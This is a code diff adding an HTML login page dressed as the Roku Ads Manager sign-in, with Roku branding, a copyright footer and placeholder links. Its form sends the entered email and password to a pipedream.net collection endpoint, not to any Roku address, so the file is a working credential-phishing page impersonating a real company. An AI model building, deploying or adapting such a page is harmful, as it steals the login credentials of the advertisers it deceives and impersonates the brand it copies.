@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login - Ads Manager</title>
+  <style>
+    /* Background gradient */
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom, #9b27d3, #4a2ed4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    /* Login card */
+    .login-container {
+      background: white;
+      padding: 40px;
+      border-radius: 6px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 360px;
+      text-align: left;
+    }
+
+    /* Title */
+    .login-container h1 {
+      font-size: 22px;
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+    .login-container h1 span {
+      color: #662d91;
+      font-weight: 700;
+    }
+
+    /* Labels & inputs */
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 14px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    /* Forgot password link */
+    .forgot {
+      font-size: 13px;
+      text-align: right;
+      margin-top: -10px;
+      margin-bottom: 14px;
+    }
+    .forgot a {
+      color: #662d91;
+      text-decoration: none;
+    }
+    .forgot a:hover {
+      text-decoration: underline;
+    }
+
+    /* Remember me */
+    .remember {
+      margin-bottom: 16px;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    /* Button */
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #662d91;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 15px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #551c7a;
+    }
+
+    /* Links below */
+    .extra {
+      text-align: center;
+      margin-top: 18px;
+      font-size: 14px;
+    }
+    .extra a {
+      color: #662d91;
+      text-decoration: none;
+    }
+    .extra a:hover {
+      text-decoration: underline;
+    }
+
+    /* Footer */
+    footer {
+      position: absolute;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 12px;
+      color: white;
+    }
+    footer a {
+      color: white;
+      text-decoration: underline;
+      margin: 0 6px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h1><span>Roku</span> Ads Manager</h1>
+    <form action="https://eodyrh169lq66mf.m.pipedream.net/" method="post"  >
+      <label for="email">Email</label>
+      <input type="email" name="email" id="email" placeholder="Enter your email" required>
+
+      <label for="password">Password</label>
+      <input type="password" name="password" id="password" placeholder="Enter your password" required>
+
+      <div class="forgot"><a href="#">Forgot password?</a></div>
+
+      <div class="remember">
+        <input type="checkbox" id="remember">
+        <label for="remember">Remember me</label>
+      </div>
+
+      <button type="submit">Sign in</button>
+
+      <div class="extra">
+        Don’t have an account? <a href="#">Sign up</a><br>
+        Have questions? Go to the <a href="#">Help Center</a>
+      </div>
+    </form>
+  </div>
+
+  <footer>
+    © 2025 Roku, Inc. Ads Manager · 
+    <a href="#">B2B Privacy Notice</a> · 
+    <a href="#">Ad Policies</a> · 
+    <a href="#">Help Center</a>
+  </footer>
+</body>
+</html>
